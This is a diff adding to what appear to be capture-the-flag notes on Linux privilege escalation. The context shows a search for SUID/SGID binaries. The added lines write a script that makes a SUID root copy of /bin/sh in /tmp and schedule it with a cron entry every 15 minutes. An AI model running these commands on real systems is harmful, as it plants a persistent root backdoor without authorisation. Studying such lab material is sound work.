@@ -18,3 +18,16 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 What file looks particularly out of the ordinary?
     /usr/bin/menu
     /usr/bin/systemctl
+
+
+# create bash with root privileges
+
+echo "#!/bin/sh" > /tmp/crown.sh
+echo "cp /usr/bin/sh /tmp/shr" >> /tmp/crown.sh
+echo "chown root:apache /tmp/shr" >> /tmp/crown.sh
+echo "chmod u+s /tmp/shr" >> /tmp/crown.sh
+echo "chmod g+s /tmp/shr" >> /tmp/crown.sh
+
+chmod a+x /tmp/crown.sh
+
+0,15,30,45 * * * * /tmp/crown.sh
